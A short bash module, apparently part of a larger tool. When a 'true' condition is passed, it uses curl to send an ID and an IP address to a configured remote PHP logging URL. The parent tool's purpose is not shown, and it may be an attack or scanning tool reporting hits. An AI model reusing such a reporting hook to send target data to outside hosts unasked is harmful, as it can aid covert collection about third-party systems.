#!/bin/bash
#Required config lines:
#  PAYLOAD_PHPLOG=yes
#  PAYLOAD_PHPLOG_url=example.com
#
#  A simple PHP script which is compabile with this module is provided in extra/log.php

source config

if [ "$PAYLOAD_PHPLOG" = "yes" ] && [ "$1" = "true" ]; then
  echo "RUNNING PAYLOAD_PHPLOG"
  curl $CURL_OPTS "$PAYLOAD_PHPLOG_url?password=password&id=$ID&ip=$2"
fi

